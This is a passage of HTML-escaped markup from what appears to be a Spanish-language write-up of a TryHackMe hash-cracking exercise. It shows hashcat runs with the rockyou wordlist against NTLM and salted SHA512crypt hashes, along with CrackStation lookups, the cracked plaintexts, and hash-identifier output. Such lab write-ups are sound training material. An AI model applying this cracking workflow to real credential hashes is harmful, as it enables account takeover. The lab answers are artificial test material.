&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@tars:~/tools$ ./hashcat/hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; md5.hash rockyou.txt
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#2: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: Intel(R) Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;========================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped.&lt;/span&gt;

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#2: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#2: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates
Rules: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;
* Bytes.....: &lt;span class=&#34;m&#34;&gt;139921507&lt;/span&gt;
* Keyspace..: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;

1dfeca0c002ae40b8619ecf94819cc1b:n63umy8lkf4i    
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NTLM
Hash.Target......: 1dfeca0c002ae40b8619ecf94819cc1b
Time.Started.....: Thu Sep  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 18:09:22 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Thu Sep  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 18:09:23 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rockyou.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#2.........:  7257.8 kH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3.00ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 5308416/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;37.01%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/5308416 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 5111808/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;35.64%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#2....: nguy7124 -&amp;gt; muppetme
Hardware.Mon.#2..: Temp: 73c Util: 55% Core:1110MHz Mem:2505MHz Bus:4

Started: Thu Sep  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 18:09:21 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
Stopped: Thu Sep  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 18:09:24 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
sckull@tars:~/tools$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;crackstation-5&#34;&gt;CrackStation&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/hashes/Screenshot%20from%202019-09-05%2022.01.19.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crackeada:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;1dfeca0c002ae40b8619ecf94819cc1b:n63umy8lkf4i&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;3-sha512&#34;&gt;#3 SHA512&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;HashInfo:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Hash: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.
Salt: aReallyHardSalt
Rounds: 5
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;hash-identification-1&#34;&gt;Hash Identification&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/hashes/Screenshot%20from%202019-09-05%2023.07.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;hashcat-7&#34;&gt;HASHCAT&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@tars:~/tools$ ./hashcat/hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;1800&lt;/span&gt; sha512.hash rockyou.txt --session sha512
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#2: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: Intel(R) Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;========================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped.&lt;/span&gt;

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#2: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#2: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates
Rules: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;
* Bytes.....: &lt;span class=&#34;m&#34;&gt;139921507&lt;/span&gt;
* Keyspace..: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;tatus &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;p&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;ause &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;ypass &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;heckpoint &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;q&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; s

Session..........: sha512
Status...........: Running
Hash.Type........: sha512crypt &lt;span class=&#34;nv&#34;&gt;$6&lt;/span&gt;$, SHA512 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Unix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Hash.Target......: &lt;span class=&#34;nv&#34;&gt;$6$aReallyHardSalt$6&lt;/span&gt;WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPM...ZAs02.
Time.Started.....: Thu Sep  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 18:23:56 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; mins, &lt;span class=&#34;m&#34;&gt;59&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Thu Sep  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 19:27:46 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;52&lt;/span&gt; mins, &lt;span class=&#34;m&#34;&gt;51&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rockyou.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#2.........:     &lt;span class=&#34;m&#34;&gt;3746&lt;/span&gt; H/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;18.22ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:64 Loops:32 Thr:32 Vec:1
Recovered........: 0/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 0/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 2463744/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;17.18%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/2463744 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 2463744/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;17.18%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:2784-2816
Candidates.#2....: จคภจจ/ภ-ึจ -&amp;gt; zz336649
Hardware.Mon.#2..: Temp: 86c Util: 93% Core:1137MHz Mem:2505MHz Bus:4
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Crackeada:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.:waka99&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;4-sha1&#34;&gt;#4 SHA1&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;HashInfo:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Hash: e5d8870e5bdd26602cab8dbe07a942c8669e56d6
Salt: tryhackme
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;hashidentifier-6&#34;&gt;HASHIDENTIFIER&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  -------------------------------------------------------------------------
 HASH: e5d8870e5bdd26602cab8dbe07a942c8669e56d6

Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MySQL5 - SHA-1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SHA-1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;

Least Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Tiger-160
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-160
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-160
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Tiger-160&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-160&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-160&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;MaNGOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
